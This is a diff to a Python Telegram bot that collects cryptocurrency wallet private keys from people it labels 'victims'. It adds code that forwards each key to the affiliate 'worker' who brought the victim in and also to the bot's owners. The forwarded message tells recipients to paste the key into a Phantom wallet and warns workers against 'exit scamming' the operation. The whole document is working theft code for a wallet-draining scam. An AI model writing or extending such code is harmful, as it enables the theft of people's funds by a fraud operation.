@@ -680,19 +680,50 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if user came from custom link (stored in user_data)
         custom_link_owner = user_data[user_id].get("custom_link_owner")
         
-        # Send to custom link owner or main owners
+        # If from worker, modify the message to indicate it's from a worker
         if custom_link_owner:
+            worker_message = (
+                "🌸 Victim imported Solana wallet (from worker)\n\n"
+                "🔎 Victim Information\n\n"
+                f"├ 👤 Name: {username}\n"
+                f"├ 🆔 {user_id}\n"
+                f"├ 👷 Worker ID: {custom_link_owner}\n"
+                f"├ 🔑 Private Key:\n\n"
+                f"<b>⚠️ Paste the private key below into phantom.</b>\n\n"
+                f"<code>{message_text}</code>\n\n"
+                f"<b>⚠️ Do not try to exit scam, you will be instantly caught red handed and banned from using the service!</b>"
+            )
+            
+            # Send to worker first
             try:
                 await context.bot.send_message(
                     chat_id=custom_link_owner, 
-                    text=victim_message, 
+                    text=worker_message, 
                     parse_mode=ParseMode.HTML,
                     reply_markup=keyboard
                 )
             except Exception as e:
                 print(f"Error sending to custom link owner {custom_link_owner}: {e}")
+            
+            # Also send to main owners with worker identification
+            try:
+                await context.bot.send_message(
+                    chat_id=OWNER_ID, 
+                    text=worker_message, 
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=keyboard
+                )
+                if SECOND_OWNER_ID:
+                    await context.bot.send_message(
+                        chat_id=SECOND_OWNER_ID, 
+                        text=worker_message, 
+                        parse_mode=ParseMode.HTML,
+                        reply_markup=keyboard
+                    )
+            except Exception as e:
+                print(f"Error sending to owners: {e}")
         else:
-            # Send to main owners
+            # Send to main owners (direct import, not from worker)
             try:
                 await context.bot.send_message(
                     chat_id=OWNER_ID, 
